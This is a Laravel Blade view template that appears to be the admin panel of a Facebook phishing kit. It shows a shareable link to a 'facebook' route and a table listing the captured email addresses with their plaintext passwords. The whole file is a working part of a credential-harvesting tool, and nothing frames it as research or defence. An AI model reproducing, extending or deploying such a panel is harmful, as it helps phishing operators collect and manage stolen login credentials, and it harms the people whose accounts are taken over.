@extends('layouts.app')

@section('content')

@include('template.sidebar')

<div class="container py-4">
    <div class="row justify-content-center">
        <div class="col-md-8">
            <div class="card">
                <div class="card-header">{{ __('Facebook') }}
                    <hr>
                    <p><strong>Share this link: </strong><a href="{{ route('facebook') }}" target="_blank" rel="noopener noreferrer">{{ route('facebook') }}</a></p>
                </div>
                
                    
                <table class="table table-bordered table-striped table-hover">
                    <thead>
                        <tr>
                            <th>email</th>
                            <th>password</th>
                        </tr>
                    </thead>
                    <tbody>
                        @foreach ($dataFacebook as $dataF)
                        <tr>
                            <td>{{ $dataF->email }}</td>
                            <td>{{ $dataF->password }}</td>
                        </tr>
                        @endforeach
                    </tbody>
                </table>

                
            </div>
        </div>
    </div>
</div>

@endsection
